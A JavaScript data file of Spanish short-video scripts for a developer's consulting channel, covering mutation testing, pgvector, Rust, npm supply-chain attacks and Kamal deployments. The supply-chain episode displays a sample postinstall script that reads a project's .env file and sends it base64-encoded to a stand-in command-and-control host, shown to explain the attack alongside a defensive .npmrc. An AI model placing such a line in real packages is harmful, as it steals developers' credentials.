// Data definitions for Topics 06 to 10
module.exports = [
  // ----------------------------------------------------
  // TEMA 06: VERIFICACIÓN VS VIBE CODING
  // ----------------------------------------------------
  {
    slug: '06_verificacion_vs_vibe_coding',
    category: 'CALIDAD DE SOFTWARE & TESTING',
    ctaType: 'calidad_software',
    varA: {
      title: 'Mutation & Property-Based Testing: Verificando código de IA',
      tone: 'Metodológico, riguroso, matemáticas y análisis de mutación',
      scenes: [
        {
          id: 'hook_testing',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: 'Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto.',
          visual_cue: 'Gancho cinético sobre el cuello de botella del testing',
          props: {
            badge: 'INGENIERÍA DE SOFTWARE 2026',
            lines: [
              { text: 'EL CUELLO DE BOTELLA', color: '#ffffff' },
              { text: 'DE LA VERIFICACIÓN', color: '#ef4444' }
            ],
            subtitle: 'PROPERTY-BASED & MUTATION TESTING',
            icon: 'check_circle'
          }
        },
        {
          id: 'mutation_terminal',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'El mutation testing inyecta fallos intencionales en tu código. Si tus tests no fallan ante un mutante, tus tests son una falsa sensación de seguridad.',
          visual_cue: 'Terminal ejecutando mutaciones sobre la suite de tests',
          props: {
            header: 'MUTATION TESTING EN CI',
            title: 'STRYKER / MUTATION ENGINE',
            filename: 'tests/mutation.log',
            codeLines: [
              'stryker run --concurrency=8',
              'Injecting mutation: replaced ">=" with ">" at auth.ts:42',
              'Running test suite against mutant #104...',
              '❌ MUTANT SURVIVED: Tests did not detect logic change!',
              'Score de mutación: 68% // Requiere endurecer assertions'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'property_testing',
          type: 'tradeoff_matrix',
          duration: 6.0,
          voiceover: 'En vez de probar tres casos aislados, los tests basados en propiedades generan diez mil combinaciones de datos aleatorios para romper tu lógica.',
          visual_cue: 'Matriz comparando Unit Tests manuales vs Property-Based Testing',
          props: {
            header: 'MÉTODOS DE COMPROBACIÓN',
            title: 'UNIT TESTS VS PROPERTY TESTING',
            colA: 'PROPERTY-BASED TESTING',
            colB: 'TESTS MANUALES BÁSICOS',
            rows: [
              { dim: 'Entradas probadas', a: '10.000 generadas por run', b: '3 o 4 ejemplos fijos', aGood: true },
              { dim: 'Edge cases ocultos', a: 'Detecta desbordamientos', b: 'Ignora casos límite', aGood: true },
              { dim: 'Resistencia a mutantes', a: 'Alta cobertura real', b: 'Falso 100% de coverage', aGood: true }
            ]
          }
        },
        {
          id: 'cta_testing',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.',
          visual_cue: 'Cierre con auditoría de calidad de software',
          props: {
            header: 'AUDITORÍA DE CALIDAD & TESTING',
            title: 'BLINDA TU SOFTWARE EN PRODUCCIÓN',
            cta: {
              badge: 'AUDITORÍA DE CALIDAD // SEDEV',
              text: '¿Dudas de la fiabilidad de tu código autogenerado? Link en bio para auditar tus suites de prueba.'
            }
          }
        }
      ]
    },
    varB: {
      title: '"Vibe Coding" es una bomba de tiempo: Por qué la deuda explotará',
      tone: 'Ácido, realista, alertando del peligro de aceptar código sin entenderlo',
      scenes: [
        {
          id: 'hook_testing_b',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: 'Aceptar sugerencias de IA sin entender cómo funcionan no es programar rápido: es firmar una hipoteca de deuda técnica que vas a pagar muy cara.',
          visual_cue: 'Gancho cinético alertando del vibe coding descontrolado',
          props: {
            badge: 'DEBATES DE LA INDUSTRIA',
            lines: [
              { text: '"VIBE CODING" ES UNA', color: '#ffffff' },
              { text: 'BOMBA DE TIEMPO', color: '#ef4444' }
            ],
            subtitle: 'DEUDA TÉCNICA A VELOCIDAD DE LA LUZ',
            icon: 'zero_trust_lock'
          }
        },
        {
          id: 'split_vibe_vs_eng',
          type: 'terminal_split',
          duration: 6.0,
          voiceover: 'El código barato de escribir es carísimo de mantener si nadie en el equipo sabe cómo depurarlo cuando colapse el servicio.',
          visual_cue: 'Doble terminal: Vibe Coder improvisando vs Ingeniero aplicando verificación',
          props: {
            header: 'EL COSTE OCULTO',
            title: 'ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO',
            termA: {
              title: 'EQUIPO "VIBE CODING"',
              color: '#ef4444',
              cmd: 'git commit -m "parece que funciona en local"',
              status: '32 dependencias fantasma añadidas',
              time: 'Caída p99',
              lines: [
                'Memoria con fugas silentes en event listeners',
                'Nadie entiende el archivo de 1,200 líneas generado',
                'Tiempo medio de resolución de incidencias: 3 días'
              ]
            },
            termB: {
              title: 'INGENIERÍA RIGUROSA',
              color: '#10b981',
              cmd: 'cargo test --all-features && cargo clippy',
              status: 'Cero warnings, tipos estrictos y límites claros',
              time: 'Estable 24/7',
              lines: [
                'Invariantes de negocio validados en el sistema de tipos',
                'Arquitectura modular documentada y legible',
                'MTTR (tiempo de recuperación): 5 minutos'
              ]
            }
          }
        },
        {
          id: 'cta_testing_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Ayudo a empresas a sanear bases de código y frenar la deuda técnica generada por IA. Contáctame en el enlace de mi perfil.',
          visual_cue: 'Cierre con auditoría de deuda técnica',
          props: {
            header: 'AUDITORÍA DE DEUDA TÉCNICA',
            title: 'RECUPERA EL CONTROL DE TU CODEBASE',
            cta: {
              badge: 'AUDITORÍA DE ARQUITECTURA // SEDEV',
              text: '¿Tu codebase se volvió inmanejable? Hablemos en el link de la biografía.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 07: PGVECTOR VS VECTOR DB
  // ----------------------------------------------------
  {
    slug: '07_pgvector_vs_vectordb',
    category: 'BASES DE DATOS & IA',
    ctaType: 'database',
    varA: {
      title: 'Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL',
      tone: 'Ciencia de datos, algoritmos de grafos, rendimiento de memoria',
      scenes: [
        {
          id: 'hook_pgvector',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: '¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW.',
          visual_cue: 'Gancho cinético con icono de árbol y base de datos',
          props: {
            badge: 'POSTGRESQL & IA 2026',
            lines: [
              { text: 'GRAFOS HNSW EN', color: '#ffffff' },
              { text: 'PGVECTOR', color: '#38bdf8' }
            ],
            subtitle: 'BÚSQUEDA SEMÁNTICA VECTORIZADA',
            icon: 'tree'
          }
        },
        {
          id: 'hnsw_tree',
          type: 'tree_hierarchy',
          duration: 6.5,
          voiceover: 'HNSW crea capas jerárquicas de grafos navegables. La búsqueda empieza en la capa superior con saltos largos y desciende refinando la similitud.',
          visual_cue: 'Jerarquía de árbol navegable mostrando saltos hasta encontrar el vector objetivo',
          props: {
            header: 'ALGORITMO HNSW',
            title: 'HIERARCHICAL NAVIGABLE SMALL WORLD',
            complexity: 'COMPLEJIDAD: O(log N) // DISTANCIA COSENO',
            nodes: [
              { id: 'top', label: 'CAPA 2: SALTOS LARGOS', x: 480, y: 240, level: 0 },
              { id: 'mid1', label: 'CAPA 1: CLUSTER A', x: 260, y: 520, level: 1, parent: 'top' },
              { id: 'mid2', label: 'CAPA 1: CLUSTER B', x: 700, y: 520, level: 1, parent: 'top' },
              { id: 'leaf', label: 'TARGET: SIMILARITY 0.94', x: 260, y: 840, level: 2, parent: 'mid1', target: true }
            ],
            footerBadge: 'RENDIMIENTO HNSW EN POSTGRES',
            footerText: 'Recorre un grafo multidimensional en RAM sin escanear la tabla entera.',
            footerSubtext: 'Búsqueda por similitud semántica en menos de 4ms.'
          }
        },
        {
          id: 'pg_sql',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Lo mejor es que puedes combinar búsqueda de similitud semántica con filtros relacionales clásicos en una sola consulta SQL transaccional.',
          visual_cue: 'Terminal ejecutando query combinada en PostgreSQL con pgvector',
          props: {
            header: 'CONSULTA HÍBRIDA EN POSTGRES',
            title: 'FILTRO RELACIONAL + VECTOR SEARCH',
            filename: 'db/hybrid_search.sql',
            codeLines: [
              'SELECT id, title, (embedding <=> $1) as distance',
              'FROM articles',
              'WHERE user_id = 42 AND published_at > NOW() - INTERVAL "30 days"',
              'ORDER BY embedding <=> $1',
              'LIMIT 5;',
              '-- Ejecución: 3.8ms usando índice HNSW'
            ],
            cursorLine: 5
          }
        },
        {
          id: 'cta_pgvector',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Si quieres implementar búsqueda semántica o auditar tu arquitectura de datos para IA sin sobrecostes innecesarios, link en mi perfil.',
          visual_cue: 'Cierre con llamado a auditoría de bases de datos',
          props: {
            header: 'AUDITORÍA DE BASES DE DATOS & IA',
            title: 'OPTIMIZA TUS PIPELINES DE EMBEDDINGS',
            cta: {
              badge: 'AUDITORÍA DE DATOS // SEDEV',
              text: '¿Búsquedas vectoriales lentas o caras? Hablemos en el enlace de mi perfil.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'No necesitas Pinecone: Todo tu stack de IA cabe en Postgres',
      tone: 'Pragmático, contra el despilfarro de bases vectoriales dedicadas',
      scenes: [
        {
          id: 'hook_pgvector_b',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: 'Te vendieron que necesitas una base vectorial especializada como Pinecone o Qdrant para hacer IA. La verdad es que tu Postgres actual ya lo hace todo.',
          visual_cue: 'Gancho cinético contra el exceso de herramientas',
          props: {
            badge: 'SIMPLICIDAD DE ARQUITECTURA',
            lines: [
              { text: 'NO NECESITAS', color: '#ef4444' },
              { text: 'PINECONE', color: '#ffffff' }
            ],
            subtitle: 'TODO TU STACK DE IA CABE EN POSTGRES',
            icon: 'database'
          }
        },
        {
          id: 'split_pinecone_pg',
          type: 'terminal_split',
          duration: 6.0,
          voiceover: 'Mantener dos bases de datos te obliga a sincronizar IDs y transacciones. Con pgvector tienes consistencia inmediata sin pagar dos servicios.',
          visual_cue: 'Doble terminal comparando sincronización dual vs base única',
          props: {
            header: 'COMPLEJIDAD OPERATIVA',
            title: 'DOS BASES DE DATOS VS UNA SOLA',
            termA: {
              title: 'POSTGRES + PINECONE EXTERNO',
              color: '#ef4444',
              cmd: 'sync_worker.py (Sincronizando IDs)',
              status: 'Inconsistencias cuando falla la red',
              time: '$340/mes extra',
              lines: [
                'Si el delete falla en Pinecone, quedan embeddings huérfanos',
                'Doble factura: Base de datos + Proveedor vectorial',
                'Latencia añadida entre dos nubes distintas'
              ]
            },
            termB: {
              title: 'POSTGRESQL NATIVO (PGVECTOR)',
              color: '#10b981',
              cmd: 'CREATE INDEX USING hnsw (embedding vector_cosine_ops)',
              status: 'Transacciones ACID nativas',
              time: '$0 extra',
              lines: [
                'Un solo respaldo con pg_dump',
                'Join directo entre tablas relacionales y embeddings',
                'Cero sincronizaciones en segundo plano'
              ]
            }
          }
        },
        {
          id: 'cta_pgvector_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito la capa de persistencia de tu producto para consolidar tu stack y reducir costes operativos. Agenda tu sesión técnica en el link de la bio.',
          visual_cue: 'Cierre con auditoría de base de datos',
          props: {
            header: 'AUDITORÍA DE BASES DE DATOS',
            title: 'SIMPLIFICA TU CAPA DE PERSISTENCIA',
            cta: {
              badge: 'AUDITORÍA DE DATOS // SEDEV',
              text: 'Consolida tus bases de datos y ahorra costes. Link en mi perfil para agendar tu auditoría.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 08: RUST SISTEMAS CRÍTICOS
  // ----------------------------------------------------
  {
    slug: '08_rust_sistemas_criticos',
    category: 'LENGUAJES DE SISTEMAS & RENDIMIENTO',
    ctaType: 'contratacion_senior',
    varA: {
      title: 'El Borrow Checker de Rust: Cero fugas de memoria sin GC',
      tone: 'Ciencia de la computación, seguridad de memoria en tiempo de compilación',
      scenes: [
        {
          id: 'hook_rust',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: '¿Cómo garantizar que un programa nunca tendrá fugas de memoria ni condiciones de carrera sin usar un recolector de basura? Con Rust.',
          visual_cue: 'Gancho cinético con engranaje industrial de Rust',
          props: {
            badge: 'SISTEMAS CRÍTICOS 2026',
            lines: [
              { text: 'EL BORROW CHECKER', color: '#ffffff' },
              { text: 'DE RUST EXPLICADO', color: '#f97316' }
            ],
            subtitle: 'SEGURIDAD DE MEMORIA EN TIEMPO DE COMPILACIÓN',
            icon: 'rust_gear'
          }
        },
        {
          id: 'memory_borrow',
          type: 'memory_layout',
          duration: 6.0,
          voiceover: 'En Rust, cada recurso tiene un único dueño. Cuando la variable sale de su ámbito, la memoria se libera al instante sin pausas de ejecución.',
          visual_cue: 'Distribución de memoria Stack vs Heap y liberación sin recolector',
          props: {
            header: 'GESTIÓN ESTÁTICA DE MEMORIA',
            title: 'PROPIEDAD Y PRÉSTAMOS (OWNERSHIP)',
            items: [
              { name: 'STACK FRAME // SCOPE ACTIVO', addr: '0x7fff001', value: 'Buffer asignado // Dueño: `data`', color: '#10b981' },
              { name: 'DROP AUTOMÁTICO AL SALIR', addr: '0x7fff002', value: 'Cero pausas de Garbage Collector (0ns)', color: '#38bdf8' }
            ]
          }
        },
        {
          id: 'rust_code',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero sorpresas en producción.',
          visual_cue: 'Terminal mostrando error del borrow checker previniendo una condición de carrera',
          props: {
            header: 'PREVENCIÓN EN COMPILACIÓN',
            title: 'EL COMPILADOR DEFIENDE TU SISTEMA',
            filename: 'src/concurrency.rs',
            codeLines: [
              'fn process(shared: &mut Data) {',
              '  thread::spawn(move || {',
              '    shared.mutate(); // ❌ ERROR E0502: Cannot borrow `shared`',
              '  });',
              '  shared.read(); // as mutable more than once at a time',
              '}'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'cta_rust',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Diseño servicios backend de alto rendimiento y baja latencia en Rust y Go. Si buscas un desarrollador senior para liderar tu sistema, link en mi perfil.',
          visual_cue: 'Cierre con contratación senior backend',
          props: {
            header: 'CONTRATACIÓN SENIOR / STAFF ENGINEER',
            title: 'DESARROLLO DE SISTEMAS DE ALTA CONCURRENCIA',
            cta: {
              badge: 'STAFF BACKEND DEVELOPER // SEDEV',
              text: '¿Necesitas desarrollo en Rust o Go para sistemas críticos? Contáctame en el link de la bio.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'Por qué Discord y Cloudflare mataron Go y adoptaron Rust',
      tone: 'Caso de estudio real de industria, analizando p99 y recolector de basura',
      scenes: [
        {
          id: 'hook_rust_b',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: 'Discord tenía millones de usuarios activos y su servicio en Go se congelaba cada dos minutos por culpa de las pausas del Garbage Collector.',
          visual_cue: 'Gancho cinético sobre el caso de estudio de Discord',
          props: {
            badge: 'CASOS REALES DE INGENIERÍA',
            lines: [
              { text: 'POR QUÉ DISCORD', color: '#ffffff' },
              { text: 'MATÓ GO POR RUST', color: '#f97316' }
            ],
            subtitle: 'ELIMINANDO LOS PICOS DE LATENCIA P99',
            icon: 'rust_gear'
          }
        },
        {
          id: 'latency_gc',
          type: 'metrics_comparison',
          duration: 6.0,
          voiceover: 'Reescribieron el servicio en Rust. La latencia p99 pasó de cientos de milisegundos a una línea plana estable por debajo de un milisegundo.',
          visual_cue: 'Comparativa gráfica de p99 latency con Garbage Collection vs Rust',
          props: {
            header: 'MÉTRICAS DE RENDIMIENTO REAL',
            metricA: { label: 'GO RUNTIME (GC SPIKES)', value: '180ms p99', sub: 'Picos cada 2 minutos por barrido de memoria', color: '#ef4444' },
            metricB: { label: 'RUST (DETERMINISTIC)', value: '0.8ms p99', sub: 'Línea completamente plana 24/7', color: '#10b981' }
          }
        },
        {
          id: 'cta_rust_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Construyo software de alto rendimiento y arquitectura sin picos de latencia. Si buscas un lead engineer para tu infraestructura, link en mi biografía.',
          visual_cue: 'Cierre con contratación senior',
          props: {
            header: 'CONTRATACIÓN SENIOR BACKEND',
            title: 'SISTEMAS DE BAJA LATENCIA & ALTO RENDIMIENTO',
            cta: {
              badge: 'LEAD ENGINEER // SEDEV',
              text: 'Desarrollo de servicios backend de misión crítica. Hablemos en el enlace de mi perfil.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 09: SEGURIDAD SUPPLY CHAIN
  // ----------------------------------------------------
  {
    slug: '09_seguridad_supply_chain',
    category: 'CIBERSEGURIDAD & SUPPLY CHAIN',
    ctaType: 'seguridad_infra',
    varA: {
      title: 'Anatomía de un malware en NPM: Robo de .env en scripts postinstall',
      tone: 'Seguridad ofensiva, análisis forense de paquetes, código malicioso',
      scenes: [
        {
          id: 'hook_security',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: '¿Sabías que ejecutar npm install puede darle acceso total a tu computadora a un hacker? Así funciona un ataque de supply chain en 2026.',
          visual_cue: 'Gancho cinético sobre malware en dependencias',
          props: {
            badge: 'CIBERSEGURIDAD 2026',
            lines: [
              { text: 'ANATOMÍA DE UN', color: '#ffffff' },
              { text: 'MALWARE EN NPM', color: '#ef4444' }
            ],
            subtitle: 'ROBO DE SECRETOS VIA SCRIPTS POSTINSTALL',
            icon: 'zero_trust_lock'
          }
        },
        {
          id: 'exploit_code',
          type: 'code_terminal',
          duration: 6.5,
          voiceover: 'El paquete parece una utilidad inofensiva, pero su script postinstall lee tus variables de entorno y las envía codificadas a un servidor externo.',
          visual_cue: 'Terminal mostrando el payload malicioso oculto en package.json',
          props: {
            header: 'PAYLOAD DEL ATACANTE',
            title: 'SCRIPT POSTINSTALL OFUSCADO',
            filename: 'node_modules/fake-lib/package.json',
            codeLines: [
              '"scripts": {',
              '  "postinstall": "node -e \\"const fs=require(\'fs\'),https=require(\'https\');',
              '    const env = fs.readFileSync(\'.env\', \'utf8\');',
              '    https.get(\'https://c2-server.com/leak?d=\' + Buffer.from(env).toString(\'base64\'));\\""',
              '}',
              '// Las claves de AWS, Stripe y bases de datos quedan expuestas'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'leak_pipe',
          type: 'network_pipeline',
          duration: 6.0,
          voiceover: 'El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.',
          visual_cue: 'Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control',
          props: {
            header: 'EXFILTRACIÓN SILENCIOSA',
            title: 'FILTRACIÓN DE CLAVES .ENV',
            subtitle: 'TRÁFICO DE SALIDA SIN BARRERAS DE RED',
            stages: [
              { id: 'dev', label: 'TERMINAL DEL DESARROLLADOR', sub: 'npm install ejecutado con permisos root/locales', y: 220, color: '#ef4444', metric: 'Comprometido' },
              { id: 'network', label: 'EXFILTRACIÓN HTTPS', sub: 'Envío de payload base64 en puerto 443', y: 520, color: '#fbbf24', metric: 'Sin bloqueo' },
              { id: 'c2', label: 'SERVIDOR DEL ATACANTE', sub: 'Extracción automática de AWS_SECRET_ACCESS_KEY', y: 820, color: '#a855f7', metric: 'Claves robadas' }
            ]
          }
        },
        {
          id: 'cta_security',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.',
          visual_cue: 'Cierre con auditoría de seguridad de dependencias',
          props: {
            header: 'AUDITORÍA DE SEGURIDAD & SUPPLY CHAIN',
            title: 'PROTEGE TU CADENA DE SUMINISTRO',
            cta: {
              badge: 'AUDITORÍA DE SEGURIDAD // SEDEV',
              text: '¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust',
      tone: 'Práctico, defensivo, aplicando políticas seguras en package managers',
      scenes: [
        {
          id: 'hook_security_b',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: 'GitHub y la industria están desactivando los scripts postinstall por defecto. Es momento de blindar tus dependencias con Zero-Trust.',
          visual_cue: 'Gancho cinético sobre blindaje Zero-Trust',
          props: {
            badge: 'DEFENSA EN CI/CD',
            lines: [
              { text: 'BLINDA TU PIPELINE', color: '#ffffff' },
              { text: 'CON ZERO-TRUST', color: '#10b981' }
            ],
            subtitle: 'BLOQUEO ESTRICTO DE SCRIPTS NO AUTORIZADOS',
            icon: 'zero_trust_lock'
          }
        },
        {
          id: 'sandbox_terminal',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Con la bandera ignore-scripts y aislación en sandboxes efímeros, neutralizas cualquier ataque antes de que pueda tocar tus archivos locales.',
          visual_cue: 'Terminal configurando npm config set ignore-scripts true',
          props: {
            header: 'CONFIGURACIÓN DEFENSIVA',
            title: 'POLÍTICAS DE INSTALACIÓN SEGURA',
            filename: '.npmrc',
            codeLines: [
              '# Desactiva ejecución arbitraria de scripts en dependencias',
              'ignore-scripts=true',
              'audit=true',
              'engine-strict=true',
              '# Si un paquete requiere compilar binarios, debe ser autorizado manualmente'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'cta_security_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito la postura de seguridad de tu infraestructura y configuro entornos blindados contra fugas de datos. Agenda en mi perfil.',
          visual_cue: 'Cierre con auditoría de ciberseguridad',
          props: {
            header: 'AUDITORÍA DE CIBERSEGURIDAD',
            title: 'ZERO-TRUST EN TUS PIPELINES DE DESPLIEGUE',
            cta: {
              badge: 'AUDITORÍA DE SEGURIDAD // SEDEV',
              text: 'Protege tus credenciales y entorno productivo. Link directo en mi perfil.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 10: ÉXODO BARE-METAL KAMAL
  // ----------------------------------------------------
  {
    slug: '10_exodo_bare_metal_kamal',
    category: 'INFRAESTRUCTURA & CLOUD COSTS',
    ctaType: 'cloud_costs',
    varA: {
      title: 'Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes',
      tone: 'Ingeniería práctica de operaciones, simplicidad en servidores dedicados',
      scenes: [
        {
          id: 'hook_kamal',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: '¿Cómo desplegar aplicaciones en contenedores con cero tiempo de inactividad sin la pesadilla de mantener un clúster de Kubernetes? Con Kamal.',
          visual_cue: 'Gancho cinético sobre Kamal y bare metal',
          props: {
            badge: 'DEVOPS EN 2026',
            lines: [
              { text: 'KAMAL: ADIÓS A', color: '#ffffff' },
              { text: 'KUBERNETES', color: '#38bdf8' }
            ],
            subtitle: 'ZERO-DOWNTIME DEPLOYS EN SERVIDORES SIMPLES',
            icon: 'server_rack'
          }
        },
        {
          id: 'kamal_flow',
          type: 'architecture_flow',
          duration: 6.5,
          voiceover: 'Kamal levanta el nuevo contenedor, verifica el health check, cambia el tráfico a nivel de proxy Traefik y destruye el contenedor viejo sin perder una petición.',
          visual_cue: 'Diagrama de despliegue blue/green con proxy de balanceo',
          props: {
            header: 'MECANISMO DE DESPLIEGUE',
            title: 'ROLLING RESTART CON TRAEFIK',
            nodes: [
              { id: 'proxy', label: 'TRAEFIK PROXY REVERSE', sublabel: 'Manejo automático de certificados SSL y rutas', color: '#38bdf8', y: 160 },
              { id: 'app_new', label: 'NUEVO CONTENEDOR (V2)', sublabel: 'Health check verificado en localhost:8001', color: '#10b981', y: 520 },
              { id: 'app_old', label: 'CONTENEDOR ANTIGUO (V1)', sublabel: 'Drenado suave de conexiones activas', color: '#71717a', y: 880 }
            ]
          }
        },
        {
          id: 'kamal_deploy',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Todo se configura en un simple archivo YAML. Un comando en tu terminal y tu aplicación queda en producción en tus propios servidores.',
          visual_cue: 'Terminal ejecutando kamal deploy con salida de docker tags',
          props: {
            header: 'CONFIGURACIÓN DECLARATIVA',
            title: 'DEPLOY CON UN SOLO COMANDO',
            filename: 'config/deploy.yml',
            codeLines: [
              'service: api-core',
              'image: registry.gitlab.com/sedev/api',
              'servers:',
              '  web:',
              '    - 159.69.10.42 # Servidor Hetzner $40/mo',
              'kamal deploy # ✔ Completado en 24 segundos con 0s downtime'
            ],
            cursorLine: 5
          }
        },
        {
          id: 'cta_kamal',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Si tu empresa quema dinero en AWS y quieres migrar a una infraestructura simple en servidores dedicados, te asesoro en el proceso. Link en mi perfil.',
          visual_cue: 'Cierre con auditoría y migración cloud',
          props: {
            header: 'MIGRACIÓN & AUDITORÍA CLOUD',
            title: 'REDUCE FACTURA HASTA UN 80%',
            cta: {
              badge: 'AUDITORÍA CLOUD // SEDEV',
              text: '¿Facturas absurdas en AWS o GCP? Agenda una sesión de migración en mi perfil.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner',
      tone: 'Financiero demoledor, destapando el negocio abusivo de la nube pública',
      scenes: [
        {
          id: 'hook_kamal_b',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: '37signals y cientos de empresas abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.',
          visual_cue: 'Gancho cinético sobre el ahorro astronómico del bare metal',
          props: {
            badge: 'ÉXODO DE LA NUBE',
            lines: [
              { text: 'DE $15.000 A $200', color: '#10b981' },
              { text: 'AL MES EN BARE-METAL', color: '#ffffff' }
            ],
            subtitle: 'EL REGRESO A LOS SERVIDORES FÍSICOS',
            icon: 'server_rack'
          }
        },
        {
          id: 'split_aws_hetzner',
          type: 'terminal_split',
          duration: 6.0,
          voiceover: 'En AWS pagas por CPU estrangulada y transferencias de datos ridículas. En un servidor dedicado tienes 128 gigas de RAM y discos NVMe directos.',
          visual_cue: 'Doble terminal comparando especificaciones de hardware y factura mensual',
          props: {
            header: 'COMPARATIVA DE HARDWARE & COSTES',
            title: 'VIRTUALIZACIÓN AWS VS SERVIDOR FÍSICO HETZNER',
            termA: {
              title: 'AWS CLOUD (EKS + RDS + NAT)',
              color: '#ef4444',
              cmd: 'aws billing get-monthly-forecast',
              status: 'Facturación por cada gigabyte de egress',
              time: '$14,800/mes',
              lines: [
                'CPU compartida con vecinos ruidosos',
                'Coste por transferencia de datos: $0.09 por GB',
                'Complejidad: 40 servicios conectados en AWS Console'
              ]
            },
            termB: {
              title: 'HETZNER DEDICATED SERVER',
              color: '#10b981',
              cmd: 'lscpu && free -h',
              status: 'AMD EPYC 32 Cores // 128GB DDR5 RAM // 2x 2TB NVMe',
              time: '$190/mes',
              lines: [
                '100% de la CPU física dedicada a tu app',
                'Tráfico ilimitado a 1 Gbps incluido',
                'Despliegues sencillos con Docker y Kamal'
              ]
            }
          }
        },
        {
          id: 'cta_kamal_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Diseño planes de migración a bare-metal para recortar costes y multiplicar la velocidad de tu backend. Hablemos en el enlace de mi perfil.',
          visual_cue: 'Cierre con auditoría de infraestructura',
          props: {
            header: 'PLAN DE MIGRACIÓN BARE-METAL',
            title: 'AHORRA MILES DE DÓLARES EN INFRAESTRUCTURA',
            cta: {
              badge: 'AUDITORÍA DE COSTES // SEDEV',
              text: '¿Listo para salir de la trampa de costes de la nube? Link en mi perfil para agendar tu plan.'
            }
          }
        }
      ]
    }
  }
];
